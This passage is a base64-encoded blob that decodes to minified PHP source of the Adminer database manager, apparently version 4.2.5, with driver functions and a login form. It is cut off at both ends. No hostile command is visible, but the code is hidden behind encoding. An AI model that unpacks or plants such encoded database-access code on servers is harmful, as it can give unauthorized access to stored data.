pLCRCKTskcD1hcnJheSgpO3ByZWdfbWF0Y2hfYWxsKCJ+JHBmXFxzKiw/fmlzIiwkQlsxXSwkYWUsUFJFR19TRVRfT1JERVIpO2ZvcmVhY2goJGFlDQphcyRmZil7JEM9c3RyX3JlcGxhY2UoImBgIiwiYCIsJGZmWzJdKS4kZmZbM107JHBbXT1hcnJheSgiZmllbGQiPT4kQywidHlwZSI9PnN0cnRvbG93ZXIoJGZmWzVdKSwibGVuZ3RoIj0+cHJlZ19yZXBsYWNlX2NhbGxiYWNrKCJ+JG5jfnMiLCdub3JtYWxpemVfZW51bScsJGZmWzZdKSwidW5zaWduZWQiPT5zdHJ0b2xvd2VyKHByZWdfcmVwbGFjZSgnflxccyt+JywnICcsdHJpbSgiJGZmWzhdICRmZls3XSIpKSksIm51bGwiPT4xLCJmdWxsX3R5cGUiPT4kZmZbNF0sImlub3V0Ij0+c3RydG91cHBlcigkZmZbMV0pLCJjb2xsYXRpb24iPT5zdHJ0b2xvd2VyKCRmZls5XSksKTt9aWYoJFUhPSJGVU5DVElPTiIpcmV0dXJuDQphcnJheSgiZmllbGRzIj0+JHAsImRlZmluaXRpb24iPT4kQlsxMV0pO3JldHVybg0KYXJyYXkoImZpZWxkcyI9PiRwLCJyZXR1cm5zIj0+YXJyYXkoInR5cGUiPT4kQlsxMl0sImxlbmd0aCI9PiRCWzEzXSwidW5zaWduZWQiPT4kQlsxNV0sImNvbGxhdGlvbiI9PiRCWzE2XSksImRlZmluaXRpb24iPT4kQlsxN10sImxhbmd1YWdlIj0+IlNRTCIsKTt9ZnVuY3Rpb24NCnJvdXRpbmVzKCl7cmV0dXJuDQpnZXRfcm93cygiU0VMRUNUIFJPVVRJTkVfTkFNRSwgUk9VVElORV9UWVBFLCBEVERfSURFTlRJRklFUiBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5ST1VUSU5FUyBXSEVSRSBST1VUSU5FX1NDSEVNQSA9ICIucShEQikpO31mdW5jdGlvbg0Kcm91dGluZV9sYW5ndWFnZXMoKXtyZXR1cm4NCmFycmF5KCk7fWZ1bmN0aW9uDQpsYXN0X2lkKCl7Z2xvYmFsJGc7cmV0dXJuJGctPnJlc3VsdCgiU0VMRUNUIExBU1RfSU5TRVJUX0lEKCkiKTt9ZnVuY3Rpb24NCmV4cGxhaW4oJGcsJEgpe3JldHVybiRnLT5xdWVyeSgiRVhQTEFJTiAiLigkZy0+c2VydmVyX2luZm8+PTUuMT8iUEFSVElUSU9OUyAiOiIiKS4kSCk7fWZ1bmN0aW9uDQpmb3VuZF9yb3dzKCRSLCRaKXtyZXR1cm4oJFp8fCRSWyJFbmdpbmUiXSE9Iklubm9EQiI/bnVsbDokUlsiUm93cyJdKTt9ZnVuY3Rpb24NCnR5cGVzKCl7cmV0dXJuDQphcnJheSgpO31mdW5jdGlvbg0Kc2NoZW1hcygpe3JldHVybg0KYXJyYXkoKTt9ZnVuY3Rpb24NCmdldF9zY2hlbWEoKXtyZXR1cm4iIjt9ZnVuY3Rpb24NCnNldF9zY2hlbWEoJGtnKXtyZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQpjcmVhdGVfc3FsKCRRLCRLYSl7Z2xvYmFsJGc7JEo9JGctPnJlc3VsdCgiU0hPVyBDUkVBVEUgVEFCTEUgIi50YWJsZSgkUSksMSk7aWYoISRLYSkkSj1wcmVnX3JlcGxhY2UoJ34gQVVUT19JTkNSRU1FTlQ9XFxkK34nLCcnLCRKKTtyZXR1cm4kSjt9ZnVuY3Rpb24NCnRydW5jYXRlX3NxbCgkUSl7cmV0dXJuIlRSVU5DQVRFICIudGFibGUoJFEpO31mdW5jdGlvbg0KdXNlX3NxbCgkayl7cmV0dXJuIlVTRSAiLmlkZl9lc2NhcGUoJGspO31mdW5jdGlvbg0KdHJpZ2dlcl9zcWwoJFEsJEpnKXskSj0iIjtmb3JlYWNoKGdldF9yb3dzKCJTSE9XIFRSSUdHRVJTIExJS0UgIi5xKGFkZGNzbGFzaGVzKCRRLCIlX1xcIikpLG51bGwsIi0tICIpYXMkSykkSi49IlxuIi4oJEpnPT0nQ1JFQVRFK0FMVEVSJz8iRFJPUCBUUklHR0VSIElGIEVYSVNUUyAiLmlkZl9lc2NhcGUoJEtbIlRyaWdnZXIiXSkuIjs7XG4iOiIiKS4iQ1JFQVRFIFRSSUdHRVIgIi5pZGZfZXNjYXBlKCRLWyJUcmlnZ2VyIl0pLiIgJEtbVGltaW5nXSAkS1tFdmVudF0gT04gIi50YWJsZSgkS1siVGFibGUiXSkuIiBGT1IgRUFDSCBST1dcbiRLW1N0YXRlbWVudF07O1xuIjtyZXR1cm4kSjt9ZnVuY3Rpb24NCnNob3dfdmFyaWFibGVzKCl7cmV0dXJuDQpnZXRfa2V5X3ZhbHMoIlNIT1cgVkFSSUFCTEVTIik7fWZ1bmN0aW9uDQpwcm9jZXNzX2xpc3QoKXtyZXR1cm4NCmdldF9yb3dzKCJTSE9XIEZVTEwgUFJPQ0VTU0xJU1QiKTt9ZnVuY3Rpb24NCnNob3dfc3RhdHVzKCl7cmV0dXJuDQpnZXRfa2V5X3ZhbHMoIlNIT1cgU1RBVFVTIik7fWZ1bmN0aW9uDQpjb252ZXJ0X2ZpZWxkKCRvKXtpZihwcmVnX21hdGNoKCJ+YmluYXJ5fiIsJG9bInR5cGUiXSkpcmV0dXJuIkhFWCgiLmlkZl9lc2NhcGUoJG9bImZpZWxkIl0pLiIpIjtpZigkb1sidHlwZSJdPT0iYml0IilyZXR1cm4iQklOKCIuaWRmX2VzY2FwZSgkb1siZmllbGQiXSkuIiArIDApIjtpZihwcmVnX21hdGNoKCJ+Z2VvbWV0cnl8cG9pbnR8bGluZXN0cmluZ3xwb2x5Z29ufiIsJG9bInR5cGUiXSkpcmV0dXJuIkFzV0tUKCIuaWRmX2VzY2FwZSgkb1siZmllbGQiXSkuIikiO31mdW5jdGlvbg0KdW5jb252ZXJ0X2ZpZWxkKCRvLCRKKXtpZihwcmVnX21hdGNoKCJ+YmluYXJ5fiIsJG9bInR5cGUiXSkpJEo9IlVOSEVYKCRKKSI7aWYoJG9bInR5cGUiXT09ImJpdCIpJEo9IkNPTlYoJEosIDIsIDEwKSArIDAiO2lmKHByZWdfbWF0Y2goIn5nZW9tZXRyeXxwb2ludHxsaW5lc3RyaW5nfHBvbHlnb25+Iiwkb1sidHlwZSJdKSkkSj0iR2VvbUZyb21UZXh0KCRKKSI7cmV0dXJuJEo7fWZ1bmN0aW9uDQpzdXBwb3J0KCREYyl7Z2xvYmFsJGc7cmV0dXJuIXByZWdfbWF0Y2goIn5zY2hlbWV8c2VxdWVuY2V8dHlwZXx2aWV3X3RyaWdnZXIiLigkZy0+c2VydmVyX2luZm88NS4xPyJ8ZXZlbnR8cGFydGl0aW9uaW5nIi4oJGctPnNlcnZlcl9pbmZvPDU/Inxyb3V0aW5lfHRyaWdnZXJ8dmlldyI6IiIpOiIiKS4ifiIsJERjKTt9ZnVuY3Rpb24NCmtpbGxfcHJvY2VzcygkWCl7cmV0dXJuDQpxdWVyaWVzKCJLSUxMICIubnVtYmVyKCRYKSk7fWZ1bmN0aW9uDQptYXhfY29ubmVjdGlvbnMoKXtnbG9iYWwkZztyZXR1cm4kZy0+cmVzdWx0KCJTRUxFQ1QgQEBtYXhfY29ubmVjdGlvbnMiKTt9JHc9InNxbCI7JHpoPWFycmF5KCk7JElnPWFycmF5KCk7Zm9yZWFjaChhcnJheSgnTnVtYmVycyc9PmFycmF5KCJ0aW55aW50Ij0+Mywic21hbGxpbnQiPT41LCJtZWRpdW1pbnQiPT44LCJpbnQiPT4xMCwiYmlnaW50Ij0+MjAsImRlY2ltYWwiPT42NiwiZmxvYXQiPT4xMiwiZG91YmxlIj0+MjEpLCdEYXRlIGFuZCB0aW1lJz0+YXJyYXkoImRhdGUiPT4xMCwiZGF0ZXRpbWUiPT4xOSwidGltZXN0YW1wIj0+MTksInRpbWUiPT4xMCwieWVhciI9PjQpLCdTdHJpbmdzJz0+YXJyYXkoImNoYXIiPT4yNTUsInZhcmNoYXIiPT42NTUzNSwidGlueXRleHQiPT4yNTUsInRleHQiPT42NTUzNSwibWVkaXVtdGV4dCI9PjE2Nzc3MjE1LCJsb25ndGV4dCI9PjQyOTQ5NjcyOTUpLCdMaXN0cyc9PmFycmF5KCJlbnVtIj0+NjU1MzUsInNldCI9PjY0KSwnQmluYXJ5Jz0+YXJyYXkoImJpdCI9PjIwLCJiaW5hcnkiPT4yNTUsInZhcmJpbmFyeSI9PjY1NTM1LCJ0aW55YmxvYiI9PjI1NSwiYmxvYiI9PjY1NTM1LCJtZWRpdW1ibG9iIj0+MTY3NzcyMTUsImxvbmdibG9iIj0+NDI5NDk2NzI5NSksJ0dlb21ldHJ5Jz0+YXJyYXkoImdlb21ldHJ5Ij0+MCwicG9pbnQiPT4wLCJsaW5lc3RyaW5nIj0+MCwicG9seWdvbiI9PjAsIm11bHRpcG9pbnQiPT4wLCJtdWx0aWxpbmVzdHJpbmciPT4wLCJtdWx0aXBvbHlnb24iPT4wLCJnZW9tZXRyeWNvbGxlY3Rpb24iPT4wKSwpYXMkeD0+JFgpeyR6aCs9JFg7JElnWyR4XT1hcnJheV9rZXlzKCRYKTt9JEZoPWFycmF5KCJ1bnNpZ25lZCIsInplcm9maWxsIiwidW5zaWduZWQgemVyb2ZpbGwiKTskT2U9YXJyYXkoIj0iLCI8IiwiPiIsIjw9IiwiPj0iLCIhPSIsIkxJS0UiLCJMSUtFICUlIiwiUkVHRVhQIiwiSU4iLCJJUyBOVUxMIiwiTk9UIExJS0UiLCJOT1QgUkVHRVhQIiwiTk9UIElOIiwiSVMgTk9UIE5VTEwiLCJTUUwiKTskU2M9YXJyYXkoImNoYXJfbGVuZ3RoIiwiZGF0ZSIsImZyb21fdW5peHRpbWUiLCJsb3dlciIsInJvdW5kIiwic2VjX3RvX3RpbWUiLCJ0aW1lX3RvX3NlYyIsInVwcGVyIik7JFhjPWFycmF5KCJhdmciLCJjb3VudCIsImNvdW50IGRpc3RpbmN0IiwiZ3JvdXBfY29uY2F0IiwibWF4IiwibWluIiwic3VtIik7JGRjPWFycmF5KGFycmF5KCJjaGFyIj0+Im1kNS9zaGExL3Bhc3N3b3JkL2VuY3J5cHQvdXVpZCIsImJpbmFyeSI9PiJtZDUvc2hhMSIsImRhdGV8dGltZSI9PiJub3ciLCksYXJyYXkoIihefFteb10paW50fGZsb2F0fGRvdWJsZXxkZWNpbWFsIj0+IisvLSIsImRhdGUiPT4iKyBpbnRlcnZhbC8tIGludGVydmFsIiwidGltZSI9PiJhZGR0aW1lL3N1YnRpbWUiLCJjaGFyfHRleHQiPT4iY29uY2F0IiwpKTt9ZGVmaW5lKCJTRVJWRVIiLCRfR0VUW0RSSVZFUl0pO2RlZmluZSgiREIiLCRfR0VUWyJkYiJdKTtkZWZpbmUoIk1FIixwcmVnX3JlcGxhY2UoJ35eW14/XSovKFteP10qKS4qficsJ1xcMScsJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0pLic/Jy4oc2lkKCk/U0lELicmJzonJykuKFNFUlZFUiE9PW51bGw/RFJJVkVSLiI9Ii51cmxlbmNvZGUoU0VSVkVSKS4nJic6JycpLihpc3NldCgkX0dFVFsidXNlcm5hbWUiXSk/InVzZXJuYW1lPSIudXJsZW5jb2RlKCRfR0VUWyJ1c2VybmFtZSJdKS4nJic6JycpLihEQiE9IiI/J2RiPScudXJsZW5jb2RlKERCKS4nJicuKGlzc2V0KCRfR0VUWyJucyJdKT8ibnM9Ii51cmxlbmNvZGUoJF9HRVRbIm5zIl0pLiImIjoiIik6JycpKTskaWE9IjQuMi41IjtjbGFzcw0KQWRtaW5lcnt2YXIkb3BlcmF0b3JzO2Z1bmN0aW9uDQpuYW1lKCl7cmV0dXJuIjxhIGhyZWY9J2h0dHBzOi8vd3d3LmFkbWluZXIub3JnLycgdGFyZ2V0PSdfYmxhbmsnIGlkPSdoMSc+QWRtaW5lcjwvYT4iO31mdW5jdGlvbg0KY3JlZGVudGlhbHMoKXtyZXR1cm4NCmFycmF5KFNFUlZFUiwkX0dFVFsidXNlcm5hbWUiXSxnZXRfcGFzc3dvcmQoKSk7fWZ1bmN0aW9uDQpwZXJtYW5lbnRMb2dpbigkaT1mYWxzZSl7cmV0dXJuDQpwYXNzd29yZF9maWxlKCRpKTt9ZnVuY3Rpb24NCmJydXRlRm9yY2VLZXkoKXtyZXR1cm4kX1NFUlZFUlsiUkVNT1RFX0FERFIiXTt9ZnVuY3Rpb24NCmRhdGFiYXNlKCl7cmV0dXJuDQpEQjt9ZnVuY3Rpb24NCmRhdGFiYXNlcygkSmM9dHJ1ZSl7cmV0dXJuDQpnZXRfZGF0YWJhc2VzKCRKYyk7fWZ1bmN0aW9uDQpzY2hlbWFzKCl7cmV0dXJuDQpzY2hlbWFzKCk7fWZ1bmN0aW9uDQpxdWVyeVRpbWVvdXQoKXtyZXR1cm4NCjU7fWZ1bmN0aW9uDQpoZWFkZXJzKCl7cmV0dXJuDQp0cnVlO31mdW5jdGlvbg0KaGVhZCgpe3JldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCmxvZ2luRm9ybSgpe2dsb2JhbCRWYjtlY2hvJzx0YWJsZSBjZWxsc3BhY2luZz0iMCI+DQo8dHI+PHRoPlN5c3RlbTx0ZD4nLGh0bWxfc2VsZWN0KCJhdXRoW2RyaXZlcl0iLCRWYixEUklWRVIpLCc8dHI+PHRoPlNlcnZlcjx0ZD48aW5wdXQgbmFtZT0iYXV0aFtzZXJ2ZXJdIiB2YWx1ZT0iJyxoKFNFUlZFUiksJyIgdGl0bGU9Imhvc3RuYW1lWzpwb3J0XSIgcGxhY2Vob2xkZXI9ImxvY2FsaG9zdCIgYXV0b2NhcGl0YWxpemU9Im9mZiI+DQo8dHI+PHRoPlVzZXJuYW1lPHRkPjxpbnB1dCBuYW1lPSJhdXRoW3VzZXJuYW1lXSIgaWQ9InVzZXJuYW1lIiB2YWx1ZT0iJyxoKCRfR0VUWyJ1c2VybmFtZSJdKSwnIiBhdXRvY2FwaXRhbGl6ZT0ib2ZmIj4NCjx0cj48dGg+UGFzc3dvcmQ8dGQ+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJhdXRoW3Bhc3N3b3JkXSI+DQo8dHI+PHRoPkRhdGFiYXNlPHRkPjxpbnB1dCBuYW1lPSJhdXRoW2RiXSIgdmFsdWU9IicsaCgkX0dFVFsiZGIiXSksJyIgYXV0b2NhcGl0YWxpemU9Im9mZiI+DQo8L3RhYmxlPg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KZm9jdXMoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoXCd1c2VybmFtZVwnKSk7DQo8L3NjcmlwdD4NCicsIjxwPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSciLidMb2dpbicuIic+XG4iLGNoZWNrYm94KCJhdXRoW3Blcm1hbmVudF0iLDEsJF9DT09LSUVbImFkbWluZXJfcGVybWFuZW50Il0sJ1Blcm1hbmVudCBsb2dpbicpLiJcbiI7fWZ1bmN0aW9uDQpsb2dpbigkV2QsJEcpe2dsb2JhbCR3O2lmKCR3PT0ic3FsaXRlIilyZXR1cm4NCnNwcmludGYoJ0ltcGxlbWVudCAlcyBtZXRob2QgdG8gdXNlIFNRTGl0ZS4nLCdsb2dpbigpJyk7cmV0dXJuDQp0cnVlO31mdW5jdGlvbg0KdGFibGVOYW1lKCRQZyl7cmV0dXJuDQpoKCRQZ1siTmFtZSJdKTt9ZnVuY3Rpb24NCmZpZWxkTmFtZSgkbywkVGU9MCl7cmV0dXJuJzxzcGFuIHRpdGxlPSInLmgoJG9bImZ1bGxfdHlwZSJdKS4nIj4nLmgoJG9bImZpZWxkIl0pLic8L3NwYW4+Jzt9ZnVuY3Rpb24NCnNlbGVjdExpbmtzKCRQZywkTz0iIil7ZWNobyc8cCBjbGFzcz0ibGlua3MiPic7JFZkPWFycmF5KCJzZWxlY3QiPT4nU2VsZWN0IGRhdGEnKTtpZihzdXBwb3J0KCJ0YWJsZSIpfHxzdXBwb3J0KCJpbmRleGVzIikpJFZkWyJ0YWJsZSJdPSdTaG93IHN0cnVjdHVyZSc7aWYoc3VwcG9ydCgidGFibGUiKSl7aWYoaXNfdmlldygkUGcpKSRWZFsidmlldyJdPSdBbHRlciB2aWV3JztlbHNlJFZkWyJjcmVhdGUiXT0nQWx0ZXIgdGFibGUnO31pZigkTyE9PW51bGwpJFZkWyJlZGl0Il09J05ldyBpdGVtJztmb3JlYWNoKCRWZA0KYXMkeD0+JFgpZWNobyIgPGEgaHJlZj0nIi5oKE1FKS4iJHg9Ii51cmxlbmNvZGUoJFBnWyJOYW1lIl0pLigkeD09ImVkaXQiPyRPOiIiKS4iJyIuYm9sZChpc3NldCgkX0dFVFskeF0pKS4iPiRYPC9hPiI7ZWNobyJcbiI7fWZ1bmN0aW9uDQpmb3JlaWduS2V5cygkUSl7cmV0dXJuDQpmb3JlaWduX2tleXMoJFEpO31mdW5jdGlvbg0KYmFja3dhcmRLZXlzKCRRLCRPZyl7cmV0dXJuDQphcnJheSgpO31mdW5jdGlvbg0KYmFja3dhcmRLZXlzUHJpbnQoJE5hLCRLKXt9ZnVuY3Rpb24NCnNlbGVjdFF1ZXJ5KCRILCRmaCl7Z2xvYmFsJHc7cmV0dXJuIjxwPjxjb2RlIGNsYXNzPSdqdXNoLSR3Jz4iLmgoc3RyX3JlcGxhY2UoIlxuIiwiICIsJEgpKS4iPC9jb2RlPiA8c3BhbiBjbGFzcz0ndGltZSc+KCRmaCk8L3NwYW4+Ii4oc3VwcG9ydCgic3FsIik/IiA8YSBocmVmPSciLmgoTUUpLiJzcWw9Ii51cmxlbmNvZGUoJEgpLiInPiIuJ0VkaXQnLiI8L2E+IjoiIikuIjwvcD4iO31mdW5jdGlvbg0Kcm93RGVzY3JpcHRpb24oJFEpe3JldHVybiIiO31mdW5jdGlvbg0Kcm93RGVzY3JpcHRpb25zKCRMLCRMYyl7cmV0dXJuJEw7fWZ1bmN0aW9uDQpzZWxlY3RMaW5rKCRYLCRvKXt9ZnVuY3Rpb24NCnNlbGVjdFZhbCgkWCwkXywkbywkYWYpeyRKPSgkWD09PW51bGw/IjxpPk5VTEw8L2k+IjoocHJlZ19tYXRjaCgifmNoYXJ8YmluYXJ5fiIsJG9bInR5cGUiXSkmJiFwcmVnX21hdGNoKCJ+dmFyfiIsJG9bInR5cGUiXSk/Ijxjb2RlPiRYPC9jb2RlPiI6JFgpKTtpZihwcmVnX21hdGNoKCd+YmxvYnxieXRlYXxyYXd8ZmlsZX4nLCRvWyJ0eXBlIl0pJiYhaXNfdXRmOCgkWCkpJEo9bGFuZyhhcnJheSgnJWQgYnl0ZScsJyVkIGJ5dGVzJyksc3RybGVuKCRhZikpO3JldHVybigkXz8iPGEgaHJlZj0nIi5oKCRfKS4iJyIuKGlzX3VybCgkXyk/IiByZWw9J25vcmVmZXJyZXInIjoiIikuIj4kSjwvYT4iOiRKKTt9ZnVuY3Rpb24NCmVkaXRWYWwoJFgsJG8pe3JldHVybiRYO31mdW5jdGlvbg0Kc2VsZWN0Q29sdW1uc1ByaW50KCRNLCRmKXtnbG9iYWwkU2MsJFhjO3ByaW50X2ZpZWxkc2V0KCJzZWxlY3QiLCdTZWxlY3QnLCRNKTskcz0wOyRNWyIiXT1hcnJheSgpO2ZvcmVhY2goJE0NCmFzJHg9PiRYKXskWD0kX0dFVFsiY29sdW1ucyJdWyR4XTskZT1zZWxlY3RfaW5wdXQoIiBuYW1lPSdjb2x1bW5zWyRzXVtjb2xdJyBvbmNoYW5nZT0nIi4oJHghPT0iIj8ic2VsZWN0RmllbGRDaGFuZ2UodGhpcy5mb3JtKSI6InNlbGVjdEFkZFJvdyh0aGlzKSIpLiI7JyIsJGYsJFhbImNvbCJdKTtlY2hvIjxkaXY+Ii4oJFNjfHwkWGM/IjxzZWxlY3QgbmFtZT0nY29sdW1uc1skc11bZnVuXScgb25jaGFuZ2U9J2hlbHBDbG9zZSgpOyIuKCR4IT09IiI/IiI6IiB0aGlzLm5leHRTaWJsaW5nLm5leHRTaWJsaW5nLm9uY2hhbmdlKCk7IikuIiciLm9uX2hlbHAoImdldFRhcmdldChldmVudCkudmFsdWUgJiYgZ2V0VGFyZ2V0KGV2ZW50KS52YWx1ZS5yZXBsYWNlKC8gfFwkLywgJygnKSArICcpJyIsMSkuIj4iLm9wdGlvbmxpc3QoYXJyYXkoLTE9PiIiKSthcnJheV9maWx0ZXIoYXJyYXkoJ0Z1bmN0aW9ucyc9PiRTYywnQWdncmVnYXRpb24nPT4kWGMpKSwkWFsiZnVuIl0pLiI8L3NlbGVjdD4iLiIoJGUpIjokZSkuIjwvZGl2PlxuIjskcysrO31lY2hvIjwvZGl2PjwvZmllbGRzZXQ+XG4iO31mdW5jdGlvbg0Kc2VsZWN0U2VhcmNoUHJpbnQoJFosJGYsJHYpe3ByaW50X2ZpZWxkc2V0KCJzZWFyY2giLCdTZWFyY2gnLCRaKTtmb3JlYWNoKCR2DQphcyRzPT4kdSl7aWYoJHVbInR5cGUiXT09IkZVTExURVhUIil7ZWNobyIoPGk+Ii5pbXBsb2RlKCI8L2k+LCA8aT4iLGFycmF5X21hcCgnaCcsJHVbImNvbHVtbnMiXSkpLiI8L2k+KSBBR0FJTlNUIiwiIDxpbnB1dCB0eXBlPSdzZWFyY2gnIG5hbWU9J2Z1bGx0ZXh0WyRzXScgdmFsdWU9JyIuaCgkX0dFVFsiZnVsbHRleHQiXVskc10pLiInIG9uY2hhbmdlPSdzZWxlY3RGaWVsZENoYW5nZSh0aGlzLmZvcm0pOyc+IixjaGVja2JveCgiYm9vbGVhblskc10iLDEsaXNzZXQoJF9HRVRbImJvb2xlYW4iXVskc10pLCJCT09MIiksIjxicj5cbiI7fX0kX0dFVFsid2hlcmUiXT0oYXJyYXkpJF9HRVRbIndoZXJlIl07cmVzZXQoJF9HRVRbIndoZXJlIl0pOyRZYT0idGhpcy5uZXh0U2libGluZy5vbmNoYW5nZSgpOyI7Zm9yKCRzPTA7JHM8PWNvdW50KCRfR0VUWyJ3aGVyZSJdKTskcysrKXtsaXN0KCwkWCk9ZWFjaCgkX0dFVFsid2hlcmUiXSk7aWYoISRYfHwoIiRYW2NvbF0kWFt2YWxdIiE9IiImJmluX2FycmF5KCRYWyJvcCJdLCR0aGlzLT5vcGVyYXRvcnMpKSl7ZWNobyI8ZGl2PiIuc2VsZWN0X2lucHV0KCIgbmFtZT0nd2hlcmVbJHNdW2NvbF0nIG9uY2hhbmdlPSckWWEnIiwkZiwkWFsiY29sIl0sIigiLidhbnl3aGVyZScuIikiKSxodG1sX3NlbGVjdCgid2hlcmVbJHNdW29wXSIsJHRoaXMtPm9wZXJhdG9ycywkWFsib3AiXSwkWWEpLCI8aW5wdXQgdHlwZT0nc2VhcmNoJyBuYW1lPSd3aGVyZVskc11bdmFsXScgdmFsdWU9JyIuaCgkWFsidmFsIl0pLiInIG9uY2hhbmdlPSciLigkWD8ic2VsZWN0RmllbGRDaGFuZ2UodGhpcy5mb3JtKSI6InNlbGVjdEFkZFJvdyh0aGlzKSIpLiI7JyBvbmtleWRvd249J3NlbGVjdFNlYXJjaEtleWRvd24odGhpcywgZXZlbnQpOycgb25zZWFyY2g9J3NlbGVjdFNlYXJjaFNlYXJjaCh0aGlzKTsnPjwvZGl2PlxuIjt9fWVjaG8iPC9kaXY+PC9maWVsZHNldD5cbiI7fWZ1bmN0aW9uDQpzZWxlY3RPcmRlclByaW50KCRUZSwkZiwkdil7cHJpbnRfZmllbGRzZXQoInNvcnQiLCdTb3J0JywkVGUpOyRzPTA7Zm9yZWFjaCgoYXJyYXkpJF9HRVRbIm9yZGVyIl1hcyR4PT4kWCl7aWYoJFghPSIiKXtlY2hvIjxkaXY+Ii5zZWxlY3RfaW5wdXQoIiBuYW1lPSdvcmRlclskc10nIG9uY2hhbmdlPSdzZWxlY3RGaWVsZENoYW5nZSh0aGlzLmZvcm0pOyciLCRmLCRYKSxjaGVja2JveCgiZGVzY1skc10iLDEsaXNzZXQoJF9HRVRbImRlc2MiXVskeF0pLCdkZXNjZW5kaW5nJykuIjwvZGl2PlxuIjskcysrO319ZWNobyI8ZGl2PiIuc2VsZWN0X2lucHV0KCIgbmFtZT0nb3JkZXJbJHNdJyBvbmNoYW5nZT0nc2VsZWN0QWRkUm93KHRoaXMpOyciLCRmKSxjaGVja2JveCgiZGVzY1skc10iLDEsZmFsc2UsJ2Rlc2NlbmRpbmcnKS4iPC9kaXY+XG4iLCI8L2Rpdj48L2ZpZWxkc2V0PlxuIjt9ZnVuY3Rpb24NCnNlbGVjdExpbWl0UHJpbnQoJHope2VjaG8iPGZpZWxkc2V0PjxsZWdlbmQ+Ii4nTGltaXQnLiI8L2xlZ2VuZD48ZGl2PiI7ZWNobyI8aW5wdXQgdHlwZT0nbnVtYmVyJyBuYW1lPSdsaW1pdCcgY2xhc3M9J3NpemUnIHZhbHVlPSciLmgoJHopLiInIG9uY2hhbmdlPSdzZWxlY3RGaWVsZENoYW5nZSh0aGlzLmZvcm0pOyc+IiwiPC9kaXY+PC9maWVsZHNldD5cbiI7fWZ1bmN0aW9uDQpzZWxlY3RMZW5ndGhQcmludCgkZWgpe2lmKCRlaCE9PW51bGwpe2VjaG8iPGZpZWxkc2V0PjxsZWdlbmQ+Ii4nVGV4dCBsZW5ndGgnLiI8L2xlZ2VuZD48ZGl2PiIsIjxpbnB1dCB0eXBlPSdudW1iZXInIG5hbWU9J3RleHRfbGVuZ3RoJyBjbGFzcz0nc2l6ZScgdmFsdWU9JyIuaCgkZWgpLiInPiIsIjwvZGl2PjwvZmllbGRzZXQ+XG4iO319ZnVuY3Rpb24NCnNlbGVjdEFjdGlvblByaW50KCR2KXtlY2hvIjxmaWVsZHNldD48bGVnZW5kPiIuJ0FjdGlvbicuIjwvbGVnZW5kPjxkaXY+IiwiPGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9JyIuJ1NlbGVjdCcuIic+IiwiIDxzcGFuIGlkPSdub2luZGV4JyB0aXRsZT0nIi4nRnVsbCB0YWJsZSBzY2FuJy4iJz48L3NwYW4+IiwiPHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnPlxuIiwidmFyIGluZGV4Q29sdW1ucyA9ICI7JGY9YXJyYXkoKTtmb3JlYWNoKCR2DQphcyR1KXtpZigkdVsidHlwZSJdIT0iRlVMTFRFWFQiKSRmW3Jlc2V0KCR1WyJjb2x1bW5zIl0pXT0xO30kZlsiIl09MTtmb3JlYWNoKCRmDQphcyR4PT4kWClqc29uX3JvdygkeCk7ZWNobyI7XG4iLCJzZWxlY3RGaWVsZENoYW5nZShkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm9ybScpKTtcbiIsIjwvc2NyaXB0PlxuIiwiPC9kaXY+PC9maWVsZHNldD5cbiI7fWZ1bmN0aW9uDQpzZWxlY3RDb21tYW5kUHJpbnQoKXtyZXR1cm4haW5mb3JtYXRpb25fc2NoZW1hKERCKTt9ZnVuY3Rpb24NCnNlbGVjdEltcG9ydFByaW50KCl7cmV0dXJuIWluZm9ybWF0aW9uX3NjaGVtYShEQik7fWZ1bmN0aW9uDQpzZWxlY3RFbWFpbFByaW50KCRpYywkZil7fWZ1bmN0aW9uDQpzZWxlY3RDb2x1bW5zUHJvY2VzcygkZiwkdil7Z2xvYmFsJFNjLCRYYzskTT1hcnJheSgpOyRWYz1hcnJheSgpO2ZvcmVhY2goKGFycmF5KSRfR0VUWyJjb2x1bW5zIl1hcyR4PT4kWCl7aWYoJFhbImZ1biJdPT0iY291bnQifHwoJFhbImNvbCJdIT0iIiYmKCEkWFsiZnVuIl18fGluX2FycmF5KCRYWyJmdW4iXSwkU2MpfHxpbl9hcnJheSgkWFsiZnVuIl0sJFhjKSkpKXskTVskeF09YXBwbHlfc3FsX2Z1bmN0aW9uKCRYWyJmdW4iXSwoJFhbImNvbCJdIT0iIj9pZGZfZXNjYXBlKCRYWyJjb2wiXSk6IioiKSk7aWYoIWluX2FycmF5KCRYWyJmdW4iXSwkWGMpKSRWY1tdPSRNWyR4XTt9fXJldHVybg0KYXJyYXkoJE0sJFZjKTt9ZnVuY3Rpb24NCnNlbGVjdFNlYXJjaFByb2Nlc3MoJHAsJHYpe2dsb2JhbCRnLCR3OyRKPWFycmF5KCk7Zm9yZWFjaCgkdg0KYXMkcz0+JHUpe2lmKCR1WyJ0eXBlIl09PSJGVUxMVEVYVCImJiRfR0VUWyJmdWxsdGV4dCJdWyRzXSE9IiIpJEpbXT0iTUFUQ0ggKCIuaW1wbG9kZSgiLCAiLGFycmF5X21hcCgnaWRmX2VzY2FwZScsJHVbImNvbHVtbnMiXSkpLiIpIEFHQUlOU1QgKCIucSgkX0dFVFsiZnVsbHRleHQiXVskc10pLihpc3NldCgkX0dFVFsiYm9vbGVhbiJdWyRzXSk/IiBJTiBCT09MRUFOIE1PREUiOiIiKS4iKSI7fWZvcmVhY2goKGFycmF5KSRfR0VUWyJ3aGVyZSJdYXMkWCl7aWYoIiRYW2NvbF0kWFt2YWxdIiE9IiImJmluX2FycmF5KCRYWyJvcCJdLCR0aGlzLT5vcGVyYXRvcnMpKXskc2I9IiAkWFtvcF0iO2lmKHByZWdfbWF0Y2goJ35JTiR+JywkWFsib3AiXSkpeyRsZD1wcm9jZXNzX2xlbmd0aCgkWFsidmFsIl0pOyRzYi49IiAiLigkbGQhPSIiPyRsZDoiKE5VTEwpIik7fWVsc2VpZigkWFsib3AiXT09IlNRTCIpJHNiPSIgJFhbdmFsXSI